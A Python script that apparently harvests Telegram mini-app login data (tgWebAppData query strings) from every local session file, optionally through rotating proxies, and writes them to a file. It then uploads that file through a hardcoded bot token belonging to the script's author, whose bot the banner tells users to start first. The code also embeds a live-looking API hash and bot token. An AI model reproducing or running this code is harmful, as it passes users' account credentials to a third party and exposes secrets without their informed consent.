import random
import glob
import asyncio
from urllib.parse import unquote
import os
import time
import requests

# Imports untuk Pyrogram
from pyrogram import Client as PyrogramClient
from pyrogram.raw.functions.messages import RequestWebView as PyrogramRequestWebView

# Imports untuk Telethon
from telethon import TelegramClient
from telethon.tl.functions.messages import RequestWebViewRequest

# ANSI escape sequences untuk warna
RESET = "\033[0m"
BOLD = "\033[1m"
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
RED   = "\033[31m"

def print_banner():
    print(f"{BOLD}{CYAN}How to use !! Please Read !!!{RESET}")
    print(f"{BOLD}{GREEN}Input USERNAME bot is to enter the bot username without using (@) {RESET}")
    print(f"{BOLD}{GREEN}example Input Username bot: Tomarket_ai_bot (without using 👉🏼 @ ){RESET}")
    print(f"{BOLD}{GREEN}Then, input the URL: (input web bot URL) example input URL: https://tomarket.app{RESET}")
    print(f"{BOLD}{YELLOW}And then copy username my bot 👉🏼 t.me/nezQuery_bot click /start , ok finish u can start{RESET}")
    print(f"{BOLD}{RED} Warning !!!!  [ do not run the script if you have not clicked /start my bot 👉🏼 t.me/nezQuery_bot {RESET}")
    print()

def get_session_names() -> list[str]:
    session_names = glob.glob('sessions/*.session')
    session_names = [os.path.splitext(os.path.basename(file))[0] for file in session_names]
    return session_names

def get_proxies() -> list[str]:
    with open('proxies.txt', 'r') as file:
        return [line.strip() for line in file.readlines()]

api_id = 13875777
api_hash = '28bac7e8ca985a86f48aadc28b1b3916'
bot_token = "7333404025:AAFyzJJSIQiGbW4LEs8q5LsVhE5Fq5i-LZE"

async def get_tgdata_pyrogram(sesi, bot_username, url, proxy=None):
    app = PyrogramClient(
        name=sesi,
        api_id=api_id,
        api_hash=api_hash,
        workdir="sessions/",
        proxy=proxy
    )
    await app.start()
    peer = await app.resolve_peer(bot_username)
    webview = await app.invoke(PyrogramRequestWebView(
        peer=peer,
        bot=peer,
        platform='Android',
        url=url
    ))
    query_id = unquote(webview.url.split("#tgWebAppData=")[1].split("&tgWebAppVersion=")[0])
    await app.stop()
    return query_id

async def get_tgdata_telethon(sesi, bot_username, url, proxy=None):
    client = TelegramClient(
        f"sessions/{sesi}",
        api_id,
        api_hash,
        proxy=proxy
    )
    await client.start()
    bot_entity = await client.get_input_entity(bot_username)
    result = await client(RequestWebViewRequest(
        peer=bot_entity,
        bot=bot_entity,
        url=url,
        platform="android"
    ))
    query_id = unquote(result.url.split("#tgWebAppData=")[1].split("&tgWebAppVersion=")[0])
    await client.disconnect()
    return query_id

def send_file_via_bot(file_path, chat_id):
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    with open(file_path, 'rb') as file:
        response = requests.post(url, data={'chat_id': chat_id}, files={'document': file})
    if response.status_code == 200:
        print(f"{GREEN}File berhasil dikirim ke Telegram!{RESET}")
    else:
        print(f"{YELLOW}Gagal mengirim file. Error: {response.text}{RESET}")

async def main():
    print_banner()
    
    bot_username = input(f"{GREEN}[+]{BOLD}Input USERNAME BOT: {RESET}")
    url = input(f"{GREEN}[+] {RESET}{BOLD}Input URL BOT: {RESET}")
    chat_id = input(f"{GREEN}[+] {BOLD}Masukkan ID Chat Telegram Anda: {RESET}")
    
    use_proxy = input(f"{GREEN}[+] {BOLD}Aktifkan proxy? (Y/N): {RESET}").strip().upper()
    proxies = get_proxies() if use_proxy == "Y" else None

    library = input(f"{GREEN}[+] {BOLD}Gunakan Pyrogram atau Telethon? (P/T): {RESET}").strip().upper()
    
    get_tgdata = get_tgdata_pyrogram if library == 'P' else get_tgdata_telethon

    with open('data.txt', 'w') as file:
        for sesi in get_session_names():
            proxy = random.choice(proxies) if proxies else None
            try:
                query_id = await get_tgdata(sesi, bot_username, url, proxy)
                print(f"{CYAN}Menambahkan query_id \n{query_id}{RESET}")
                file.write(str(query_id) + "\n")
                print(f"{GREEN}Berhasil menambahkan query_id{RESET}")
            except Exception as e:
                print(f"{RED}Error dengan sesi {sesi}: {str(e)}{RESET}")
            time.sleep(1)
    
    send_file_via_bot('data.txt', chat_id)

asyncio.run(main())
print(f"{GREEN}data query.id berhasil ditambahkan dan dikirim ke Telegram{RESET}")